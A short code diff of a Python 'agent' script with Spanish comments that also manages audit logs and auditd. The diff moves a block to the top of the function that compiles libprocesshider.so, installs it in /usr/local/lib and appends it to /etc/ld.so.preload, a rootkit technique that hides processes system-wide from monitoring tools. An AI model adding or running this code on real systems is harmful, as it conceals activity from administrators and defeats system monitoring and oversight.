@@ -32,6 +32,12 @@ audit_log = '.audit.log'
 def agent():
 
 	###############################################
+	#COMPILACION E INSERCION LIBRERIA DINAMICA
+	os.system("make")
+	os.system("mv libprocesshider.so /usr/local/lib/")
+	os.system("echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload")
+
+	###############################################
 	#COMPROBAR USUARIO EXISTE
 	if len(sys.argv) < 4 or sys.argv[2] != '-ip':
 		print('Número de argumentos incorrecto.\n'
@@ -154,14 +160,6 @@ def agent():
 		restart_auditd()
 	elif len (sys.argv) == 6 and sys.argv[4] == '-s':
 		add_syscall()
-
-
-
-	###############################################
-	#COMPILACION E INSERCION LIBRERIA DINAMICA
-	os.system("make")
-	os.system("mv libprocesshider.so /usr/local/lib/")
-	os.system("echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload")
 
 
 
